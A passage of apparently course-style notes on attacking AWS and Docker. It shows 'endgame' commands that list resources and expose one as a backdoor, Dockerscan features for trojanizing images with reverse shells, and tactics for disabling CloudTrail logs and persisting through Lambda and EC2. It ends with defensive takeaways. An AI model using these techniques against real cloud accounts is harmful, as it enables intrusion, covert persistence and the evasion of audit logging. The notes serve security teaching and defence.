   endgame list-resources --service s3  # S3 buckets
   endgame list-resources --service all  # All services
   ```
  Create Backdoor:
   ```bash
   endgame expose --service iam --name test-resource-exposure
   ```
  Establish Persistence:
    Attackers use rogue accounts to persist access across reboots or policy changes.
    Modify IAM roles or attach policies to give themselves `AdministratorAccess`.
 31] Backdooring Docker Images Using Dockerscan
 Tool: [Dockerscan (GitHub)](https://github.com) – Docker hacking and analysis utility
 Key Capabilities for Attackers:
  Network Scanning:
   Discover Docker registries exposed on a network.
  Registry Manipulation:
   Delete image/tags.
   Push backdoored (malicious) images.
   Upload arbitrary files to registries.
  Sensitive Data Extraction:
   Read environment variables to obtain: Passwords, URLs/IPs, Credentials
  Image Trojanization: Modify image entrypoints, Inject reverse shells, Change the user context in Docker.
 32]Maintaining Access and Covering Tracks in AWS (CloudTrail Exploitation)
 CloudTrail Overview:
  AWS service that logs user activity for security audits and monitoring.
  Often disabled by default, requiring manual setup.
 Attacker Tactics After Gaining Admin Access:
  Disabling Logging
  Checking Trail Status
  Restoring Logs Post-Attack
  Permanent Log Removal Options
 Deleting or pausing logs may trigger alerts from AWS Security Monitoring tools (e.g., GuardDuty).
 Advanced Covering Tracks Techniques:
  Encrypt logs with new KMS key (prevent access).
  Move trails to a different S3 bucket.
  Use Lambda functions to delete logs dynamically.
 Persistence Techniques in AWS:
  Modify user data on EC2 to run post-startup scripts (backdoors).
  Spin up new EC2s with sensitive roles using modified AMIs.
  Add backdoors into Lambda functions (e.g., creating IAM users).
  Create/rotate access keys using hidden Lambda functions.
 Defensive Takeaways:
  Enable CloudTrail and enforce immutable logging.
  Set up GuardDuty, CloudWatch alarms, and S3 versioning.
  Monitor unusual IAM/Lambda/EC2 activity.
  Use AWS Config rules to enforce baseline security policies.
 


